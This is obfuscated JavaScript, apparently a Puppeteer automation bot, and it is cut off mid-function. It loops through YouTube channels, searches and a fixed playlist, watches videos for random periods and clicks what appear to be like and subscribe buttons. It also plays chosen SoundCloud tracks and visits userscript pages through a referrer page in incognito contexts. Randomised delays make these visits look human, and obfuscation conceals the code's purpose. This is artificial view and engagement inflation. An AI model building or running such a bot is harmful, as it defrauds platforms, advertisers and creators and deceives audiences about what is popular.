const W = d,
  V = c,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * -0x3a9 + 0x1dfe + -0x21a6))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xa27 + 0x1d * 0x29 + -0xecc * 0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x2256 + -0x7 * 0x62 + 0x2504);
    let h = e[f];
    if (b['DWXRXd'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x89 * -0x36 + -0x1 * 0x1303 + -0xb * -0x45b, s, t, u = 0x265a * 0x1 + 0x1e0 * -0x13 + -0x2 * 0x15d; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x1fcf + -0x1f19 + 0x2 * 0x1f76) ? s * (0xd * 0x293 + -0x20aa + -0x8d) + t : t, r++ % (-0x188f + 0xda8 + 0x22f * 0x5)) ? p += String['fromCharCode'](-0x3 * -0x10 + -0x1 * -0x1b83 + -0x1ab4 & s >> (-(-0x3 * -0x241 + 0xf79 + -0xa * 0x239) * r & 0xee0 * -0x1 + -0xee6 + 0x1dcc)) : -0x13ce + 0x9 * 0x2b4 + 0x243 * -0x2) {
          t = o['indexOf'](t);
        }
        for (let v = -0x8b0 + -0xf4 + -0x4 * -0x269, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1dc4 + -0x19c7 * 0x1 + 0x379b))['slice'](-(0x21d * -0x12 + 0x609 + -0x2003 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x9 * 0x3ae + -0x18d + -0x7d * -0x47,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x1606 + 0x1c1e * -0x1 + 0x618; u < 0x1767 + -0x15b * 0x7 + -0x3 * 0x44e; u++) {
          p[u] = u;
        }
        for (u = 0x9 * -0x3cc + -0x22f2 + 0x9 * 0x7ae; u < 0x175e + 0xe8 * -0x3 + -0x13a6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x999 + -0x14e7 * 0x1 + 0x1f80), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0xd56 + 0x1 * 0x19d8 + -0x272e, q = -0xef2 * -0x1 + 0x1 * -0x1edf + 0xfed;
        for (let v = -0x2189 + 0xd69 + 0x1420; v < n['length']; v++) {
          u = (u + (0x3 * 0x735 + -0xc * -0x1ed + 0x479 * -0xa)) % (-0x215c + 0x5 * -0x667 + 0x425f), q = (q + p[u]) % (0x48 + 0x39 * 0x86 + 0x1 * -0x1d1e), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1a35 + -0x398 + 0xb * -0x1f7)]);
        }
        return t;
      };
      b['aixMUf'] = m, c = arguments, b['DWXRXd'] = !![];
    }
    const j = e[0x8bc * -0x4 + -0x26a5 * -0x1 + -0x3b5],
      k = f + j,
      l = c[k];
    return !l ? (b['IJgwmZ'] === undefined && (b['IJgwmZ'] = !![]), h = b['aixMUf'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xaad3 + 0x3d9a + -0x733d + (0x28f6 + 0x2e8 * -0x10 + 0x2011 * 0x2) * random()) : await standardWaitForNetIdle(f), await wait(-0x2 * -0x3fb + -0xab3 + 0x1 * 0x1645 + (0x28bd + -0x3a * 0x78 + 0x1983) * random()), -0x2 * 0x773 + 0x18ed + -0xa06;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x9 * 0x2b4 + 0x215 * -0x8 + 0xbdc), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xf4 + -0x37 * 0x64 + 0x1671;
}
async function randomWait() {
  return await wait(-0x19c7 * 0x1 + -0x241b + 0x516a + (-0x67 * -0xf + -0x21d6 * -0x1 + -0x1457) * random()), -0x18d + 0xe62 + -0x335 * 0x4;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x1606 + 0x1c1e * -0x1 + 0x618, 0x1767 + -0x15b * 0x7 + -0x5 * 0x2c7), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1 * -0x19a0b + -0x1a351 + 0x2c * 0x182d) * getRandomInt(0x175e + 0xe8 * -0x3 + -0x14a4, -0x999 + -0x14e7 * 0x1 + 0x1e85), h)), -0x1 * -0xd56 + 0x1 * 0x19d8 + -0x272d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xef2 * -0x1 + 0x1 * -0x1edf + 0xfed;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x2189 + 0xd69 + 0x1421]['split']('\x20');
    for (let k = 0x3 * 0x735 + -0xc * -0x1ed + 0x411 * -0xb; k < i['length']; k += -0x215c + 0x5 * -0x667 + 0x4161)
      j += i[k] * h[i[k + (0x48 + 0x39 * 0x86 + 0x1 * -0x1e1d)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1a35 + -0x398 + 0x1 * -0x1697)['map'](l => Array['from'](l['children']))['flat'](0x8bc * -0x4 + -0x26a5 * -0x1 + -0x3b4)['map'](l => l['childNodes'][0x12ee + -0x2707 + 0x141a]['childNodes'][0x6e + 0x76e + 0x7dc * -0x1]['childNodes'][0x16d * -0xa + 0xfa8 + -0x165]['childNodes'][0x5 * 0x4 + 0x55 * 0x53 + -0x1ba3]['childNodes'][0x16a5 * -0x1 + 0xa * 0x20f + 0xb0 * 0x3]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x199e + 0xa9b + -0x2051, 0x6c1 + 0x43f * -0x8 + 0x3 * 0xf95)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1e8f * 0x1 + -0x74e5 + 0x90ee);
  const h = await getMaxTime(f),
    i = Math['min']((-0x61f7 + 0x10c1f + 0x4038) * getRandomInt(-0x23f7 + 0x61b * -0x4 + 0x3c65, -0x2 * -0x557 + 0x95 * -0xd + 0x18c * -0x2), h);
  return await wait(i), 0x1e9f + -0x2656 + 0x13 * 0x68;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xe84 + 0x3b * -0x65 + 0x1 * 0x8c3]['children'][0xc19 + 0x2f + -0x6 * 0x20c]['children'][0x211 * -0x5 + 0xad * 0x1b + -0x7ea]['children'][-0x389 + 0x20ca + -0x1 * 0x1d41]['children'][-0x1 * -0x17b7 + -0x558 + -0x125f][R(0x16, 'ZVNj') + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1a * 0x21 + -0x1 * 0x20b0 + -0x1 * -0x240b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x4ca + 0x130a * 0x1 + -0xddc * 0x1 + (0x1 * -0x1523 + -0x4 * -0x3dc + -0x1f7 * -0x3) * random()
  }), await wait(0x1bf9 + 0x266c + -0x4071 + (0x86a + -0x107 * -0x7 + -0xe6f * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2079 + 0x254 * -0x1 + 0x22cf]['childNodes'][0xc90 + 0x6 * -0x411 + 0x1b1 * 0x7]['childNodes'][0x726 + -0x1614 + 0xeef]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x3 * 0x5db + -0x2d2 * -0x7 + 0x2b * -0xde]['childNodes'][-0x25f3 + 0x222b * 0x1 + 0x58 * 0xb]['childNodes'][0x6b * -0x3 + -0x128f * -0x2 + -0x23db]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1450 + 0x1 * 0x55e + -0x88f * 0x3),
          r = -0x915 + -0x5 * -0x2a + 0x2f * 0x2d;
        for (let u = -0xcdf + 0x937 + -0x18 * -0x27; u < q['length']; u += 0x8 * -0x134 + -0x2 * 0xc61 + -0x3e * -0x8e)
          r += q[u] * k[q[u + (0x1 * 0x48f + -0x135d * 0x1 + -0x1 * -0xecf)]];
        return r;
      }(n);
  });
  await wait((0x2 * 0x32ab + 0xbe9 + -0x337 * 0x11) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1be42 + -0x7 * -0x2c3 + 0x2954d * 0x1) * getRandomInt(-0x4 * -0x337 + 0x2006 + 0x2ce1 * -0x1, 0x207c + 0x1470 + 0x78e * -0x7), h + (0xb * -0x1f + 0x7 * -0x3fd + 0x30c8));
  return await wait(i), -0x1 * 0x1346 + -0x51 * -0x35 + 0x282;
}
async function keyWatch(f) {
  const S = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * 0x2571 + 0x1743 + 0xe2e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + S(0xd) + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * -0x45b + 0x21 * 0x22 + -0x2fb * -0x1 + (0xd * -0x7c + 0x1e06 + -0x13d2) * Math['random']());
    });
  }, 0x112 * 0x1 + 0xa42 + 0x1004);
  await wait(0x7d75 * -0xf + -0x4 * 0x589 + 0x5b * 0x21cd);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x14855 + 0x4869 + -0x7a93 * -0x4) * getRandomInt(0xab2 + -0xd * -0xf1 + -0x16eb, -0x1 * 0x243f + 0x716 + -0x1 * -0x1d42)), clearInterval(h), -0x2317 * 0x1 + -0x1 * 0x665 + -0xf7 * -0x2b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x5 * -0x7aa + -0x1f97 + -0x6bb;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xd9 * 0x18 + -0x6 * -0x22d + 0x1 * 0x74b;
    await randomWait();
  }
  return -0x1 * -0x64d + 0x158f * 0x1 + 0x949 * -0x3;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1854 * 0x1 + -0x767 * 0x5 + 0xcaf + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x383 * -0x7 + -0x4 * -0x707 + -0x2b * 0x15 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bl = [
    'https://op',
    'iSoJW4ixxenarCokyW',
    'WRFdVmobrfxdLCk6gqtcIa',
    'zwfZEwzVCMSUBW',
    'rg/en/scri',
    'close',
    'none',
    'ts,suga\x20bt',
    'W7GyzmkQzGFdNfRcIIG',
    'jtHbjueWjuu5jq',
    'CMvZzwfYy2G',
    'ChrZlZqWnte3lq',
    'WRH9WPnfW7NcQmoBW43dHSoR',
    'yMfJAY1ZAgfWzq',
    'W5XnW7jTbbNcR3hcSSks',
    'pts/452314',
    'CMjLyxn0ihn1BG',
    'mmk5jX9WWRddG8kKwfC',
    'spyder',
    'easyfork.o',
    'WQ7cISopv2/dUIVcIq',
    'pts/by-sit',
    'E8k2bhRcVmkseI3cKSoa'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x5a9 * 0x5 + 0xb47 + -0x2794 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2d6 + 0x5 * 0x33 + 0x1d7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x7e92 + 0x7e4a + -0x4d14 + getRandomInt(-0x2 * -0x49 + -0x17 * 0x425 + 0x9959, -0x8 * 0x126d + 0x9ac6 + 0x6dd2));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xb4d + -0x28 * 0xa7 + 0x2566), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1af8 + -0x210b + 0x613;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x6d * 0x1f + -0xb67 + -0x1cc, -0x1020 + -0x1 * -0x1972 + -0x10 * 0x92)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x4d * 0x25 + 0x26b3 + 0x2 * -0x1502 + floor((-0x1 * -0x1c0a + -0x1bb * -0xd + -0x3 * 0xf8b) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xa9babaca + 0xd5f5fd44 + 0x53c4bd86),
          -0x3 * 0xa6d95 + -0x8716fd + 0x1265fbc,
          -0x182 * 0x59 + -0x5c04 + 0x16236,
          0x97 * 0x22 + 0x1b98 + -0x2c6 * 0x11
        ], y = [
          0x1b74 + 0x1f55 * 0x1 + -0x3ab1 * 0x1,
          0x124b + 0x9a3 * -0x2 + -0x1 * -0x10b,
          -0x3 * 0x199 + 0x1931 + -0x145e,
          0xbaa * -0x2 + -0x1f70 + 0x36c4
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x5 * -0xb2 + -0x491 * 0x1 + 0x5 * 0x19c)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2 * -0xcf2 + 0x7ac + 0x10 * -0x219; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2 * -0x11f5 + 0xd0 * -0xc + 0x2daa) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2 * -0x1082 + -0x1 * -0x22f9 + -0x127 * 0x3b] = A[0x1 * -0x13d7 + 0x20 * 0x121 + -0x1039 * 0x1] = A[0x175 * -0xe + -0xc * -0x183 + 0x243] = A[0x25bf * 0x1 + -0x25e2 + 0x1 * 0x25] = A[-0x5ad + -0xa4f * -0x2 + -0x2 * 0x777] = A[0x2 * -0x8cc + 0x99f * 0x2 + -0x1a2] = A[-0x13 * -0x59 + -0x195c * 0x1 + 0x12c6] = A[0xcb3 + 0x2448 + -0x97 * 0x53] = A[0x4 * 0x6df + -0x9f9 + -0x117c] = A[-0x31a + 0x9 * -0x1e9 + 0xb * 0x1d9] = A[0x5cf * 0x1 + -0x6d4 + 0x10e] = A[0x1c32 + 0x1707 + 0x332f * -0x1] = A[0x6 * 0x2f1 + -0x716 * -0x1 + -0x18b1] = A[-0x8c * 0x10 + -0x1 * -0x13e2 + -0xb16] = A[0x5 * 0x5b0 + 0xafd * -0x1 + -0x1166 * 0x1] = A[0x1d35 + -0x1 * 0x2e5 + 0xd21 * -0x2] = A[0x2 * 0x1c6 + 0xd77 + -0x1b2 * 0xa] = 0x13 * -0xd6 + 0x2606 + -0x1624, this['blocks'] = A) : this['blocks'] = [
                0x2131 + -0x11bf + -0x2 * 0x7b9,
                0xdc * -0x2b + -0xb2f * 0x3 + -0x4681 * -0x1,
                0x1462 + -0x25fb * 0x1 + 0x5 * 0x385,
                0xefb + -0x1bf7 + 0xcfc,
                -0x23c6 + -0x1 * -0x1ef1 + -0x4d5 * -0x1,
                -0x7ca * -0x4 + -0x15d7 * -0x1 + -0x34ff,
                -0x1452 + 0x24f6 + -0x10a4,
                -0x19e + -0x1850 + 0x19ee,
                -0x149 + 0x18bd + 0x5dd * -0x4,
                0x1 * 0x22de + -0x17 * -0x13 + 0xc31 * -0x3,
                -0x3 * 0x89a + -0xdb5 + -0x55 * -0x77,
                0x1 * 0x2455 + -0x101 * -0x11 + -0x3566,
                -0x1 * -0x1d68 + -0x2ed + -0x1 * 0x1a7b,
                0x6 * 0x36d + 0x1 * 0xf45 + -0x23d3,
                0x107 * 0xd + 0x1 * -0x10f1 + 0x396,
                -0x190f + 0x1e7 * -0x1 + 0x11 * 0x196,
                0x1a28 + -0x121 * 0xa + 0xede * -0x1
              ], this['h0'] = 0x1 * 0xa15ae9b5 + -0x970e8040 + 0x5cf8b98c, this['h1'] = 0x1cf2feeae * 0x1 + -0x48a82f * 0xb + -0xdc430920, this['h2'] = 0x7514957 + -0x10175bdf * 0x5 + 0x13535e6 * 0xbb, this['h3'] = 0x38e298b * 0x4 + -0x9 * 0x1e548fd + -0x15 * -0xe80f33, this['h4'] = 0x317 * -0x3c6b0f + -0x1 * 0x11034f98c + 0x28eb6a6d5, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2579 + -0x1 * 0xb + 0x1 * -0x256e, this['finalized'] = this['hashed'] = -0x15d6 + -0x1aab + 0x3081, this['first'] = -0x7 * 0x1bd + 0x31 * 0xaf + -0x1553;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xc15 + 0x1280 + -0x1 * 0x1e95, O = J['length'] || 0x2055 * 0x1 + 0x19e1 + -0x3a36, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x2627 + 0x20a8 + -0x46cf, P[0x1494 + 0x613 + -0x1aa7 * 0x1] = this['block'], P[-0x1 * 0xe27 + 0x24a1 + -0x97 * 0x26] = P[-0x14d + -0x966 * 0x3 + 0x1d80] = P[-0xba8 + 0x8a7 * -0x4 + 0x2e46] = P[0xf15 + -0x22b3 + 0x13a1] = P[0x15b7 + 0x11b5 + -0x4 * 0x9da] = P[-0x128c + 0xabc + -0x191 * -0x5] = P[-0x1 * -0x211d + 0xe8f + -0x2fa6] = P[-0x1 * 0x218e + -0x1c84 + 0x3e19] = P[0x2 * 0xb52 + 0xe * -0x12b + -0x642] = P[0x2546 * 0x1 + -0x4d2 + 0x1 * -0x206b] = P[-0xecd * 0x1 + 0xcee + -0x1 * -0x1e9] = P[-0x21e * 0xe + -0x1 * -0x1da7 + -0x1 * -0x8] = P[-0x199 * -0xd + 0xbf * 0x1e + 0x2b1b * -0x1] = P[0x2156 + 0x2176 + -0x1 * 0x42bf] = P[0x26d0 + 0x17 * 0xbf + 0xb2f * -0x5] = P[0xb4f + 0x1ce0 + 0x4 * -0xa08] = 0x3 * 0x4ea + -0xabd * 0x2 + 0x6bc), K) {
                    for (N = this['start']; M < O && N < 0x769 * 0x1 + -0x5b9 + -0x170; ++M)
                      P[N >> -0xf * 0x8b + -0xd2b + 0x1552] |= J[M] << y[-0xa0e + -0x285 + 0xc96 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1286 + 0x19a0 + 0x2 * -0x36d; ++M)
                      (L = J['charCodeAt'](M)) < -0x12b4 + -0x89 * 0x1 + 0x13bd ? P[N >> 0x1d19 + -0xbff + -0x1118] |= L << y[0x1519 + -0x26c * 0x10 + -0x11 * -0x10a & N++] : L < -0x2287 + 0x9 * 0x2c + 0x10d * 0x27 ? (P[N >> -0x1 * 0x1643 + -0x2 * -0xf4f + -0x859] |= (0x1c7b * -0x1 + 0x1599 + 0x7a2 * 0x1 | L >> -0x7ca + 0xdfa + 0x107 * -0x6) << y[0x1b * 0x146 + 0x9c7 * 0x1 + -0x2c26 & N++], P[N >> 0x1b6a + -0x7 * -0x31a + -0x1 * 0x311e] |= (-0x2 * 0x135a + -0xc7 * 0x1b + 0x3c31 | -0x1204 + -0x1487 + 0x26ca & L) << y[0x5dc + 0xd77 + -0xce * 0x18 & N++]) : L < 0x4529 * -0x5 + -0xd * 0x15c6 + 0x34cdb || L >= 0x16aaf + -0x305 * -0x3b + -0x13cd6 ? (P[N >> -0x103 * 0xd + -0xea2 + -0x1 * -0x1bcb] |= (-0x20e0 + -0x5bc * 0x1 + 0x277c | L >> 0xa * 0xb5 + 0x1 * 0x1997 + 0xfd * -0x21) << y[-0x76 * -0xd + 0x7f7 * 0x3 + 0x2 * -0xef0 & N++], P[N >> 0x2 * 0x1229 + 0x10a7 + -0x413 * 0xd] |= (0x5c9 + -0x2053 + 0x1b0a | L >> -0x201b * 0x1 + 0x7 * 0x13 + 0x1f9c & 0x10ff + 0x2a * 0x94 + -0x2908) << y[0x6b4 + 0x203b * 0x1 + -0x26ec & N++], P[N >> -0x24f5 + -0x1922 + -0x2f5 * -0x15] |= (-0x161c * -0x1 + -0x11ff + 0xb9 * -0x5 | -0xccb + 0x2b7 + 0xa53 & L) << y[0x161 * 0x19 + -0x3e * -0x75 + -0x3ecc & N++]) : (L = -0x1 * -0xc3a9 + -0x2701 * -0x3 + -0x38ac + ((0x63d + -0x1 * 0x1b4f + 0x1f * 0xcf & L) << 0xa91 + -0x1af + 0x8 * -0x11b | -0x11cc + 0xe40 + 0x78b & J['charCodeAt'](++M)), P[N >> -0x15a + 0xc2d + -0xad1] |= (0x11c4 + 0x1512 + -0x25e6 | L >> 0x17ec + 0xc29 + -0x15 * 0x1b7) << y[-0x3d6 + 0xa99 * -0x1 + -0x56 * -0x2b & N++], P[N >> 0x9b * 0xa + 0x1ab + -0x5 * 0x18b] |= (0xe5 + -0x2 * -0x878 + 0x9 * -0x1ed | L >> 0x200d + 0x244b + -0x444c & -0x175a + -0x195e + -0x30f7 * -0x1) << y[-0xa50 + 0x222e * -0x1 + 0x2c81 & N++], P[N >> -0x1e17 * -0x1 + 0x11cd + 0x17f1 * -0x2] |= (0x1 * 0x1ad6 + 0x18e2 + -0x3338 | L >> -0x1d23 + 0x55a + 0x17cf & 0x1 * -0x910 + 0x1 * -0xd81 + 0x16d0) << y[0xc * 0x22a + 0x75f * 0x3 + -0x36f * 0xe & N++], P[N >> -0x785 * -0x3 + 0xb * 0x269 + -0x3110] |= (-0x8 * 0x78 + -0xeb * 0x1c + 0x1df4 | -0x1487 + -0x1 * -0x2669 + -0x11a3 & L) << y[-0x18c6 * -0x1 + -0x1 * -0xf8 + -0x19bb & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2074 + -0x3 * 0x11 + -0x2001 ? (this['block'] = P[-0x204d + -0x5b + 0x20b8], this['start'] = N - (0x3fd * 0x1 + -0x12 * 0x207 + 0x20c1 * 0x1), this['hash'](), this['hashed'] = 0xb * -0x1b7 + 0xce5 + 0x5f9) : this['start'] = N;
                }
                return this['bytes'] > -0x198fd833b + 0xa0 * 0x59cb9f + 0x260de3fda && (this['hBytes'] += this['bytes'] / (0x1cbc8 * 0x33fa + -0x5e * -0xd914e0 + 0x52f07c70) << -0x1 * 0x17ee + 0x26f2 + -0x3c1 * 0x4, this['bytes'] = this['bytes'] % (0x1f15afe74 + 0xa6ee2a08 + -0x19849287c)), this;
